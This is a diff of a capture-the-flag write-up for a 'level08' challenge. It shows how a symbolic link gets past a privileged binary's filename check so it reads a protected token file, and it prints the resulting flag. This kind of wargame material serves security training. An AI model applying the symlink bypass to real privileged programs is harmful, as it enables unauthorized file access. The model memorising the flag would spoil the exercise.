@@ -1,25 +1,15 @@
-il y a deux fichier a la racine level08 qui est un programme c compile et token qui est le fichier a lire
+There are two files in /home.
+	- level08, a binary executable
+	- token, a text file
 
 
-l'hexa du code level08 ne nous apprends pas grand chose.
+The binary takes a file in argument, and reads its content. The flag is in token,
+	but we do not have the right to read it.
+The binary as its sticky bit set, but still refuses to read the token.
 
-nm:
-         U open@@GLIBC_2.0
-         U printf@@GLIBC_2.0
-         U read@@GLIBC_2.0
-         U strstr@@GLIBC_2.0
-         U write@@GLIBC_2.0
+We try to create a symbolic link 
+ln -sb ~/token /tmp/t
 
-
-on voit que le code utiliser peut nous permettre de faire de l'overflow,
-on commence donc par essayer avec read en lui donnant un gros fichier, cela ne crash pas car il stop a 1024 caractere.
-On test maintenant avec le strstr:
-
-Pour agrandir le nom du fichier:
-ln -sb ~/token /tmp/ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt
-
-Puis:
-./level08 /tmp/ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt
+And then:
+./level08 /tmp/t
 > quif5eloekouj29ke0vouxean
-
-Exploit ok (pas comme prevu je voulais juste voir a quelle moment il utilise le strstr mais pourquoi pas)
